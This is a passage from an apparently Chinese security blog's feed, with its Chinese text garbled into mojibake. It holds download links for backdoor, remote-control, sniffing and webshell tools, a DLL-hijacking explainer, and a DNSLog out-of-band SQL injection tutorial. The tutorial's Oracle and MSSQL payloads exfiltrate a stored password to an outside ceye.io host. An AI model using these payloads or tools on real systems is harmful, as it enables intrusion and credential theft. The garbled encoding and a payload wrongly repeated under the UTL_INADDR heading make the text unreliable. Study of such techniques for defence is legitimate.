class="line">é“¾æ¥ï¼šhttps:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1axawbvMmSEaWCLAVpCYdOg</span><br><span class="line">æå–ç ï¼šebyu</span><br><span class="line"></span><br><span class="line">ç«¯å£æ‰«æå·¥å…·ï¼š</span><br><span class="line">é“¾æ¥ï¼šhttps:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1nFprLyFkuDtoi4NFhl2HKA</span><br><span class="line">æå–ç ï¼šuohn</span><br><span class="line"></span><br><span class="line">åŠ å£³å·¥å…·ï¼š</span><br><span class="line">é“¾æ¥ï¼šhttps:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1LMmHxBmHq0DqEFHLnPxBzw</span><br><span class="line">æå–ç ï¼šudt4</span><br><span class="line"></span><br><span class="line">è™šæ‹Ÿæœºå·¥å…·ï¼š</span><br><span class="line">é“¾æ¥ï¼šhttps:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1ZWsAeIzrMYsxKS6G9wAJ4g</span><br><span class="line">æå–ç ï¼šuc1c</span><br><span class="line"></span><br><span class="line">è¿œç¨‹æ§åˆ¶å·¥å…·ï¼š</span><br><span class="line">é“¾æ¥ï¼šhttps:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1CugNPycxYgW8Pw_OdSa7qw</span><br><span class="line">æå–ç ï¼škted</span><br><span class="line"></span><br><span class="line">qqè½¯ä»¶å·¥å…·ï¼š</span><br><span class="line">é“¾æ¥ï¼šhttps:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1ComhHBtCgKA4i9YRprH90g</span><br><span class="line">æå–ç ï¼štd7o</span><br><span class="line"></span><br><span class="line">è¶…çº§å­—å…¸å·¥å…·ï¼š</span><br><span class="line">é“¾æ¥ï¼šhttps:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1NqQLKCWX1XQCVGFQ4AHh7g</span><br><span class="line">æå–ç ï¼šc0we</span><br><span class="line"></span><br><span class="line">åé—¨å·¥å…·ï¼š</span><br><span class="line">é“¾æ¥ï¼šhttps:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1YhUnX6D_-ZCn6ZL2sZYUEw</span><br><span class="line">æå–ç ï¼š2x3f</span><br><span class="line"></span><br><span class="line">æ•°æ®åŒ…å—…æ¢å·¥å…·ï¼š</span><br><span class="line">é“¾æ¥ï¼šhttps:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1UxrQlBr-GBAI1cLK8IVoeA</span><br><span class="line">æå–ç ï¼šwn7z</span><br><span class="line"></span><br><span class="line">å…¶ä»–å·¥å…·ï¼š</span><br><span class="line">é“¾æ¥ï¼šhttps:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1UgKFrJf4C4BXdI9yPlpkWA</span><br><span class="line">æå–ç ï¼šhwly</span><br></pre></td></tr></table></figure><h3 id="shellç®¡ç†å™¨"><a href="#shellç®¡ç†å™¨" class="headerlink" title="shellç®¡ç†å™¨"></a>shellç®¡ç†å™¨</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">åŠŸå¤«å†é«˜ä¹Ÿæ€•èœåˆ€ï¼š</span><br><span class="line">é“¾æ¥ï¼šhttps:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1Z5BFRkUQvRup0Je3hv3iUQ</span><br><span class="line">æå–ç ï¼šjcpw</span><br></pre></td></tr></table></figure><h3 id="CTFå·¥å…·åŒ…"><a href="#CTFå·¥å…·åŒ…" class="headerlink" title="CTFå·¥å…·åŒ…"></a>CTFå·¥å…·åŒ…</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">é“¾æ¥ï¼šhttps:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;11Cid17J5Dl1nR2PqGl8YUg </span><br><span class="line">æå–ç ï¼šej45 </span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Gammaå®éªŒå®¤ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å­¦ä¹ èµ„æ–™ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ä»€ä¹ˆæ˜¯DLLåŠ«æŒ</title>
      <link href="2020/10/19/%E4%BB%80%E4%B9%88%E6%98%AFDLL%E5%8A%AB%E6%8C%81/"/>
      <url>2020/10/19/%E4%BB%80%E4%B9%88%E6%98%AFDLL%E5%8A%AB%E6%8C%81/</url>
      
        <content type="html"><![CDATA[<p>Windowsåœ¨å…¶åŸºç¡€ä½“ç³»ç»“æ„ä¸­å…·æœ‰DLLçš„æœç´¢è·¯å¾„ï¼ˆåŠ è½½DLLæ–‡ä»¶è¦éµå¾ªç›®å½•æŸ¥æ‰¾ä¼˜å…ˆçº§ï¼‰ã€‚å¦‚æœä½ å¯ä»¥æ‰¾å‡ºæ²¡æœ‰ç»å¯¹è·¯å¾„çš„å¯æ‰§è¡Œæ–‡ä»¶è¯·æ±‚çš„DLLï¼ˆè§¦å‘æ­¤æœç´¢è¿‡ç¨‹ï¼‰ï¼Œåˆ™å¯ä»¥å°†æ”»å‡»ä»£ç çš„DLLæ”¾ç½®åœ¨æœç´¢è·¯å¾„çš„æ›´é«˜ä½ç½®ï¼Œä»¥ä¾¿åœ¨å®é™…ç‰ˆæœ¬ä¹‹å‰æ‰¾åˆ°å®ƒï¼Œå¹¶ä¸”Windowsä¼šæ¯«ä¸çŠ¹è±«å°†æ”»å‡»ä»£ç æä¾›ç»™åº”ç”¨ç¨‹åºã€‚<br>è®©æˆ‘ä»¬å‡è®¾Windowsçš„DLLæœç´¢è·¯å¾„å¦‚ä¸‹æ‰€ç¤ºï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Aç›®å½•ï¼š&lt;-å¯æ‰§è¡Œæ–‡ä»¶çš„å½“å‰å·¥ä½œç›®å½•ï¼Œæœ€é«˜ä¼˜å…ˆçº§ï¼Œé¦–å…ˆæ£€æŸ¥</span><br><span class="line">Bç›®å½•ï¼š\Windows</span><br><span class="line">Cç›®å½•ï¼š\ Windows \ system32</span><br><span class="line">Dç›®å½•ï¼š\ Windows \ syswow64 &lt;-æœ€ä½ä¼˜å…ˆçº§ï¼Œæœ€åæ£€æŸ¥</span><br></pre></td></tr></table></figure><p>è¿™æ—¶å€™ï¼Œå¯æ‰§è¡Œæ–‡ä»¶â€œ Foo.exeâ€è¯·æ±‚åŠ è½½â€œ bar.dllâ€ï¼Œè¯¥æ–‡ä»¶æ°å¥½ä½äºsyswow64ï¼ˆDï¼‰å­ç›®å½•ä¸­ã€‚è¿™ä½¿æ‚¨æœ‰æœºä¼šå°†æ¶æ„ç‰ˆæœ¬æ”¾ç½®åœ¨Aç›®å½•ï¼ŒBç›®å½•æˆ–Cç›®å½•ä¸­ï¼Œå¹¶å°†å…¶åŠ è½½åˆ°å¯æ‰§è¡Œæ–‡ä»¶ä¸­ã€‚<br>å¦‚å‰æ‰€è¿°ï¼Œå³ä½¿æ‚¨å¯ä»¥ç”¨è‡ªå·±çš„ç‰ˆæœ¬æ›¿æ¢DLLï¼Œå³ä½¿æ˜¯ç»å¯¹çš„å®Œæ•´è·¯å¾„ä¹Ÿæ— æ³•é˜²æ­¢è¿™ç§æƒ…å†µã€‚<br>Microsoft Windowsä½¿ç”¨Windowsæ–‡ä»¶ä¿æŠ¤æœºåˆ¶æ¥ä¿æŠ¤System32ä¹‹ç±»çš„ç³»ç»Ÿè·¯å¾„ï¼Œä½†æ˜¯åœ¨ä¼ä¸šè§£å†³æ–¹æ¡ˆä¸­ä¿æŠ¤å¯æ‰§è¡Œæ–‡ä»¶å…å—DLLåŠ«æŒçš„æœ€ä½³æ–¹æ³•æ˜¯ï¼š</p><blockquote><p>ä½¿ç”¨ç»å¯¹è·¯å¾„è€Œä¸æ˜¯ç›¸å¯¹è·¯å¾„<br>å¦‚æœæ‚¨æœ‰ä¸ªäººç­¾åï¼Œè¯·åœ¨å°†DLLåŠ è½½åˆ°å†…å­˜ä¹‹å‰å¯¹DLLæ–‡ä»¶ç­¾åå¹¶æ£€æŸ¥åº”ç”¨ç¨‹åºä¸­çš„ç­¾åã€‚å¦åˆ™è¯·ä½¿ç”¨åŸå§‹DLLå“ˆå¸Œæ£€æŸ¥DLLæ–‡ä»¶çš„å“ˆå¸Œï¼‰<br>å½“ç„¶ï¼Œè¿™ä¹Ÿä¸æ˜¯ä»…é™äºWindowsã€‚ä»ç†è®ºä¸Šè®²ï¼Œä»»ä½•å…è®¸åŠ¨æ€é“¾æ¥å¤–éƒ¨åº“çš„OSéƒ½å®¹æ˜“å—åˆ°æ”»å‡»ã€‚</p></blockquote><p>æŸ¥æ‰¾ä¸¢å¤±å¯ä»¥åŠ è½½çš„ç¼ºå°‘DLLçš„å¥½å·¥å…·ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https : &#x2F;&#x2F;processhacker.sourceforge.io&#x2F;</span><br></pre></td></tr></table></figure><p>å­¦ä¹ èµ„æº/é“¾æ¥ä»¥äº†è§£DLLåŠ«æŒ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;resources.infosecinstitute.com&#x2F;d...revisited&#x2F;</span><br><span class="line"></span><br><span class="line">https:&#x2F;&#x2F;pentestlab.blog&#x2F;2017&#x2F;03&#x2F;27&#x2F;dll-hijacking&#x2F;</span><br><span class="line"></span><br><span class="line">https:&#x2F;&#x2F;liberty-shell.com&#x2F;sec&#x2F;2019&#x2F;03&#x2F;12&#x2F;dll-hijacking&#x2F;</span><br><span class="line"></span><br><span class="line">https:&#x2F;&#x2F;astr0baby.wordpress.com&#x2F;2018&#x2F;09&#x2F;...ing-works&#x2F;</span><br><span class="line"></span><br><span class="line">https:&#x2F;&#x2F;www.sans.org&#x2F;cyber-security-summ...862085.pdf</span><br><span class="line"></span><br><span class="line">https:&#x2F;&#x2F;posts.specterops.io&#x2F;lateral-move...f61e8ab992</span><br></pre></td></tr></table></figure><p>è¿˜å»ºè®®æ­¤çº¿ç¨‹æœ‰å…³Windowsç‰¹æƒå‡çº§ã€‚è®²åº§ä¹Ÿæ¶µç›–äº†ä¸€äº›åŸºç¡€çŸ¥è¯†ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https : &#x2F;&#x2F;greysec.net&#x2F;showthread.php?tid&#x3D;</span><br></pre></td></tr></table></figure><p>ç”¨äºå‘ç°å¯èƒ½çš„DLLåˆ©ç”¨çš„å·¥å…·</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;cys3c&#x2F;Siofra [ https:&#x2F;&#x2F;github.com&#x2F;Cybereason&#x2F;siofra ]</span><br><span class="line"></span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;cyberark&#x2F;DLLSpy</span><br><span class="line"></span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;MojtabaTajik&#x2F;Robber</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Gammaå®éªŒå®¤ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DLLåŠ«æŒ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ•°æ®åº“DNSLogå¤–å¸¦æ³¨å…¥-æ€»ç»“</title>
      <link href="2020/10/19/%E6%95%B0%E6%8D%AE%E5%BA%93DNSLog%E5%A4%96%E5%B8%A6%E6%B3%A8%E5%85%A5-%E6%80%BB%E7%BB%93/"/>
      <url>2020/10/19/%E6%95%B0%E6%8D%AE%E5%BA%93DNSLog%E5%A4%96%E5%B8%A6%E6%B3%A8%E5%85%A5-%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<p><strong>sqlæ³¨å…¥ä¸­åˆ©ç”¨çš„éªšå§¿åŠ¿ä½ åˆçŸ¥é“å‡ ä¸ªï¼Ÿ</strong></p><h1 id="DNSLogå¤–å¸¦æ³¨å…¥å’ŒDNSlogå¸¦å¤–æ³¨å…¥ï¼Ÿï¼ˆOOBï¼‰"><a href="#DNSLogå¤–å¸¦æ³¨å…¥å’ŒDNSlogå¸¦å¤–æ³¨å…¥ï¼Ÿï¼ˆOOBï¼‰" class="headerlink" title="DNSLogå¤–å¸¦æ³¨å…¥å’ŒDNSlogå¸¦å¤–æ³¨å…¥ï¼Ÿï¼ˆOOBï¼‰"></a>DNSLogå¤–å¸¦æ³¨å…¥å’ŒDNSlogå¸¦å¤–æ³¨å…¥ï¼Ÿï¼ˆOOBï¼‰</h1><p>å…¶å®æ˜¯ä¸€æ ·çš„ï¼Œå«æ³•ä¸åŒï¼æœ¬äººè¿˜æ˜¯ä¹ æƒ¯å«å¤–å¸¦æ³¨å…¥ï¼Œè‡ªæˆ‘æ„Ÿè§‰ï¼Œæ¯”è¾ƒé¡ºå£</p><h1 id="ä¸ºä»€ä¹ˆéœ€è¦å¤–å¸¦æ³¨å…¥ï¼Ÿ"><a href="#ä¸ºä»€ä¹ˆéœ€è¦å¤–å¸¦æ³¨å…¥ï¼Ÿ" class="headerlink" title="ä¸ºä»€ä¹ˆéœ€è¦å¤–å¸¦æ³¨å…¥ï¼Ÿ"></a>ä¸ºä»€ä¹ˆéœ€è¦å¤–å¸¦æ³¨å…¥ï¼Ÿ</h1><p>å½“æˆ‘ä»¬å¯¹ä¸€ä¸ªæ•°æ®åº“è¿›è¡Œæ³¨å…¥æ—¶ï¼Œæ— å›æ˜¾ï¼Œä¸”æ— æ³•è¿›è¡Œæ—¶é—´æ³¨å…¥ï¼Œé‚£ä¹ˆå°±å¯ä»¥åˆ©ç”¨ä¸€ä¸ªé€šé“ï¼ŒæŠŠæŸ¥è¯¢åˆ°æ•°æ®é€šè¿‡é€šé“å¸¦å‡ºå»ï¼Œè¿™é‡Œçš„é€šé“åŒ…æ‹¬ï¼šhttpè¯·æ±‚ã€DNSè§£æã€SMBæœåŠ¡ç­‰å°†æ•°æ®å¸¦å‡ºã€‚</p><p>of courseï¼è¿™é‡Œä¸»è®²DNSlogå¤–å¸¦æ³¨å…¥</p><h1 id="mysql-DNSlogå¤–å¸¦æ³¨å…¥ï¼š"><a href="#mysql-DNSlogå¤–å¸¦æ³¨å…¥ï¼š" class="headerlink" title="mysql-DNSlogå¤–å¸¦æ³¨å…¥ï¼š"></a>mysql-DNSlogå¤–å¸¦æ³¨å…¥ï¼š</h1><h4 id="åˆ©ç”¨æ¡ä»¶"><a href="#åˆ©ç”¨æ¡ä»¶" class="headerlink" title="åˆ©ç”¨æ¡ä»¶"></a>åˆ©ç”¨æ¡ä»¶</h4><p>1.mysql.iniä¸­secure_file_privå¿…é¡»ä¸ºç©ºã€‚(PSï¼šä¿®æ”¹mysql.iniæ–‡ä»¶ï¼Œåœ¨[mysqld]ä¸‹åŠ å…¥secure_file_priv=)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysql æ–°ç‰ˆæœ¬ä¸‹secure-file-privå­—æ®µ ï¼šsecure-file-privå‚æ•°æ˜¯ç”¨æ¥é™åˆ¶LOAD DATA, SELECT ... OUTFILE, and LOAD_FILE()ä¼ åˆ°å“ªä¸ªæŒ‡å®šç›®å½•çš„ã€‚</span><br><span class="line">å½“secure_file_privçš„å€¼ä¸ºnull ï¼Œè¡¨ç¤ºé™åˆ¶mysqld ä¸å…è®¸å¯¼å…¥|å¯¼å‡º</span><br><span class="line">å½“secure_file_privçš„å€¼ä¸º&#x2F;tmp&#x2F; ï¼Œè¡¨ç¤ºé™åˆ¶mysqld çš„å¯¼å…¥|å¯¼å‡ºåªèƒ½å‘ç”Ÿåœ¨&#x2F;tmp&#x2F;ç›®å½•ä¸‹</span><br><span class="line">å½“secure_file_privçš„å€¼æ²¡æœ‰å…·ä½“å€¼æ—¶ï¼Œè¡¨ç¤ºä¸å¯¹mysqld çš„å¯¼å…¥|å¯¼å‡ºåšé™åˆ¶</span><br></pre></td></tr></table></figure><p>2.ä»payloadçœ‹å‡ºload_fileçš„è·¯å¾„æ˜¯windowsä¸‹çš„UNCè·¯å¾„ï¼Œæ‰€ä»¥mysqlå¸¦å¤–æ³¨å…¥åªèƒ½å‘ç”Ÿåœ¨windowsæœºå™¨ä¸Šã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">UNCæ˜¯ä¸€ç§å‘½åæƒ¯ä¾‹, ä¸»è¦ç”¨äºåœ¨Microsoft Windowsä¸ŠæŒ‡å®šå’Œæ˜ å°„ç½‘ç»œé©±åŠ¨å™¨, UNCå‘½åæƒ¯ä¾‹æœ€å¤šè¢«åº”ç”¨äºåœ¨å±€åŸŸç½‘ä¸­è®¿é—®æ–‡ä»¶æœåŠ¡å™¨æˆ–è€…æ‰“å°æœº.</span><br><span class="line"></span><br><span class="line">UNCå‘½åè¯­æ³•</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">UNCå‘½åä½¿ç”¨ç‰¹å®šçš„æ ‡è®°æ³•æ¥è¯†åˆ«ç½‘ç»œèµ„æº. UNCå‘½åç”±ä¸‰ä¸ªéƒ¨åˆ†ç»„æˆ- æœåŠ¡å™¨å, å…±äº«å, å’Œä¸€ä¸ªå¯é€‰çš„æ–‡ä»¶è·¯å¾„. è¿™ä¸‰ä¸ªéƒ¨åˆ†é€šè¿‡backslashè¿æ¥èµ·æ¥, å¦‚ä¸‹:</span><br><span class="line"></span><br><span class="line">\\server\share\file_path</span><br><span class="line"></span><br><span class="line">è¿™é‡Œçš„serveréƒ¨åˆ†å¼•ç”¨çš„æ˜¯ç”±DNSæˆ–è€…WINSç½‘ç»œæœåŠ¡ç»´æŠ¤çš„å­—ç¬¦ä¸². æœåŠ¡å™¨åæ˜¯ç”±system administratorè®¾å®šçš„.</span><br><span class="line"></span><br><span class="line">shareéƒ¨åˆ†å¼•ç”¨äº†ç”±ç³»ç»Ÿç®¡ç†å‘˜åˆ›å»ºçš„ä¸€ä¸ªlabel. åœ¨ç»å¤§å¤šæ•°ç‰ˆæœ¬çš„windowsä¸­, æ¯”å¦‚è¯´, å…±äº«åadmin$æŒ‡çš„æ˜¯æ“ä½œç³»ç»Ÿå®‰è£…çš„æ ¹è·¯å¾„(é€šå¸¸æ˜¯C:\WINNT æˆ– C:\WINDOWS).</span><br><span class="line"></span><br><span class="line">fileéƒ¨åˆ†å¼•ç”¨åœ¨å…±äº«ç‚¹ä¹‹ä¸‹çš„æœ¬åœ°å­æ–‡ä»¶å¤¹.</span><br><span class="line"></span><br><span class="line">UNCå‘½åå®ä¾‹ï¼š</span><br><span class="line">\\teela\admin$ (to reach C:\WINNT)</span><br><span class="line">\\teela\admin$\system32 (to reach C:\WINNT\system32)</span><br><span class="line">\\teela\temp (to reach C:\temp)</span><br><span class="line"> </span><br><span class="line">é€šè¿‡ä½¿ç”¨Windows Exloreræˆ–è€…DOMå‘½ä»¤è¡Œ, å†åŠ ä¸Šæ°å½“çš„å®‰å…¨è¯æ˜, ä½ å¯ä»¥é€šè¿‡æŒ‡å®šUNCåå­—æ¥æ˜ å°„ç½‘ç»œé©±åŠ¨å™¨, è¿œç¨‹åœ°è®¿é—®ä¸€å°è®¡ç®—æœºä¸Šçš„æ–‡ä»¶å¤¹.</span><br><span class="line"></span><br><span class="line">å‚è€ƒæ–‡ç« ï¼šhttps:&#x2F;&#x2F;www.lifewire.com&#x2F;unc-universal-naming-convention-818230</span><br></pre></td></tr></table></figure><h4 id="æ¥å—DNSè¯·æ±‚çš„DNSlogå¹³å°"><a href="#æ¥å—DNSè¯·æ±‚çš„DNSlogå¹³å°" class="headerlink" title="æ¥å—DNSè¯·æ±‚çš„DNSlogå¹³å°"></a>æ¥å—DNSè¯·æ±‚çš„DNSlogå¹³å°</h4><blockquote><p><a href="http://www.dnslog.cn/">http://www.dnslog.cn</a><br><a href="http://ceye.io/">http://ceye.io</a></p></blockquote><p>ä¹Ÿå¯ä»¥è‡ªå·±æ‰‹åŠ¨æ­å»º</p><blockquote><p>å·¥å…·åœ°å€ï¼š<br><a href="https://github.com/bugscanteam/dnslog/">https://github.com/bugscanteam/dnslog/</a></p></blockquote><h4 id="æœ¬åœ°ç¯å¢ƒå¤ç°"><a href="#æœ¬åœ°ç¯å¢ƒå¤ç°" class="headerlink" title="æœ¬åœ°ç¯å¢ƒå¤ç°"></a>æœ¬åœ°ç¯å¢ƒå¤ç°</h4><p>åœ¨ceye.ioç”³è¯·ä¸€ä¸ªè´¦å·</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/357021509.png"></p><p>æœ¬åœ°mysqlæŸ¥è¯¢ï¼Œå¸¦å…¥æŸ¥è¯¢çš„æ•°æ®åŒ…ç‰ˆæœ¬ä¿¡æ¯ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1331594550.png"></p><p>è¿™é‡Œç¨å¾®è§£é‡Šä¸€ä¸‹ï¼Œconcat()æ˜¯æŠŠå„ç§å­—ç¬¦ä¸²ç»„åˆèµ·æ¥ï¼Œæ»¡è¶³UNCå‘½åè§„åˆ™</p><p>è¿™é‡ŒæˆåŠŸæ”¶åˆ°DNSè¯·æ±‚æŸ¥è¯¢è®°å½•ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3221848381.png"></p><h6 id="æ³¨æ„ï¼š"><a href="#æ³¨æ„ï¼š" class="headerlink" title="æ³¨æ„ï¼š"></a>æ³¨æ„ï¼š</h6><p>è¿™é‡Œçš„\è½¬ä¹‰ä¹‹åä¸º<br>æŸ¥è¯¢çš„æ•°æ®å¦‚æœæœ‰ç‰¹æ®Šç¬¦å·å¯ä»¥è¿›è¡Œç¼–ç ï¼Œå¦‚hex()<br>uncæœ‰é•¿åº¦é™åˆ¶ï¼Œé•¿åº¦ä¸èƒ½è¶…è¿‡128</p><h1 id="oracle-DNSlogå¤–å¸¦æ³¨å…¥ï¼š"><a href="#oracle-DNSlogå¤–å¸¦æ³¨å…¥ï¼š" class="headerlink" title="oracle-DNSlogå¤–å¸¦æ³¨å…¥ï¼š"></a>oracle-DNSlogå¤–å¸¦æ³¨å…¥ï¼š</h1><h2 id="å››ç§å¯ä»¥åˆ©ç”¨å‡½æ•°ï¼š"><a href="#å››ç§å¯ä»¥åˆ©ç”¨å‡½æ•°ï¼š" class="headerlink" title="å››ç§å¯ä»¥åˆ©ç”¨å‡½æ•°ï¼š"></a>å››ç§å¯ä»¥åˆ©ç”¨å‡½æ•°ï¼š</h2><h4 id="UTL-HTTP-REQUESTå‡½æ•°"><a href="#UTL-HTTP-REQUESTå‡½æ•°" class="headerlink" title="UTL_HTTP.REQUESTå‡½æ•°"></a>UTL_HTTP.REQUESTå‡½æ•°</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select name from test_user where id &#x3D;1 union SELECT UTL_HTTP.REQUEST((select pass from test_user where id&#x3D;1)||&#39;.mdk941.ceye.io&#39;) FROM sys.DUAL;</span><br></pre></td></tr></table></figure><h4 id="DBMS-LDAP-INITå‡½æ•°"><a href="#DBMS-LDAP-INITå‡½æ•°" class="headerlink" title="DBMS_LDAP.INITå‡½æ•°"></a>DBMS_LDAP.INITå‡½æ•°</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select name from test_user where id &#x3D;1 union SELECT DBMS_LDAP.INIT((select pass from test_user where id&#x3D;1)||&#39;.mdk941.ceye.io&#39;,80) FROM sys.DUAL;</span><br></pre></td></tr></table></figure><h4 id="HTTPURITYPEå‡½æ•°"><a href="#HTTPURITYPEå‡½æ•°" class="headerlink" title="HTTPURITYPEå‡½æ•°"></a>HTTPURITYPEå‡½æ•°</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select name from test_user where id &#x3D;1 union SELECT HTTPURITYPE((select pass from test_user where id&#x3D;1)||&#39;.mdk941.ceye.io&#39;).GETCLOB() FROM sys.DUAL;</span><br></pre></td></tr></table></figure><h4 id="UTL-INADDR-GET-HOST-ADDRESSå‡½æ•°"><a href="#UTL-INADDR-GET-HOST-ADDRESSå‡½æ•°" class="headerlink" title="UTL_INADDR.GET_HOST_ADDRESSå‡½æ•°"></a>UTL_INADDR.GET_HOST_ADDRESSå‡½æ•°</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select name from test_user where id &#x3D;1 union SELECT HTTPURITYPE((select pass from test_user where id&#x3D;1)||&#39;.mdk941.ceye.io&#39;).GETCLOB() FROM sys.DUAL;</span><br></pre></td></tr></table></figure><h6 id="æ³¨æ„ï¼š-1"><a href="#æ³¨æ„ï¼š-1" class="headerlink" title="æ³¨æ„ï¼š"></a>æ³¨æ„ï¼š</h6><p>||åœ¨oracleä¸­å¹¶ä¸æ˜¯è¿ç®—ç¬¦ï¼Œè€Œæ˜¯èµ·åˆ°å­—ç¬¦æ‹¼æ¥çš„ä½œç”¨</p><h1 id="MSSQL-DNSLogå¤–å¸¦æ³¨å…¥ï¼š"><a href="#MSSQL-DNSLogå¤–å¸¦æ³¨å…¥ï¼š" class="headerlink" title="MSSQL-DNSLogå¤–å¸¦æ³¨å…¥ï¼š"></a>MSSQL-DNSLogå¤–å¸¦æ³¨å…¥ï¼š</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;mssql.php?id&#x3D;1;</span><br><span class="line"></span><br><span class="line">DECLARE @host varchar(1024);       &#x2F;&#x2F;å®šä¹‰å˜é‡hostï¼Œå®šä¹‰æ•°æ®ç±»å‹</span><br><span class="line"></span><br><span class="line">SELECT@host&#x3D;(SELECT master.dbo.fn_varbintohexstr(convert(varbinary,rtrim(pass))) </span><br><span class="line"></span><br><span class="line">FROM test.dbo.test_user where [USER] &#x3D; &#39;admin&#39;)%2b&#39;.cece.nk40ci.ceye.io&#39;;  &#x2F;&#x2F;æŠŠæŸ¥è¯¢åˆ°çš„æ•°æ®æ‹¼æ¥åˆ°UNCå­—ç¬¦ä¸²ä¸­ï¼Œç„¶åå†èµ‹ç»™å˜é‡host</span><br><span class="line"></span><br><span class="line">EXEC(&#39;master..xp_dirtree &quot;\&#39;%2b@host%2b&#39;\foobar$&quot;&#39;); </span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;master..xp_dirtreeå‡½æ•°   ç”¨äºè·å–æ‰€æœ‰æ–‡ä»¶å¤¹çš„åˆ—è¡¨å’Œç»™å®šæ–‡ä»¶å¤¹å†…éƒ¨çš„å­æ–‡ä»¶å¤¹</span><br><span class="line"></span><br><span class="line">#### å½“ç„¶ä¹Ÿå¯ä»¥æ›¿æ¢æˆå¦å¤–ä¸¤ä¸ªå‡½æ•°ï¼š</span><br><span class="line"></span><br><span class="line">masterâ€¦xp_fileexist (ç”¨äºç¡®å®šä¸€ä¸ªç‰¹å®šçš„æ–‡ä»¶æ˜¯å¦å­˜åœ¨äºç¡¬ç›˜)</span><br><span class="line"></span><br><span class="line">masterâ€¦xp_subdirs 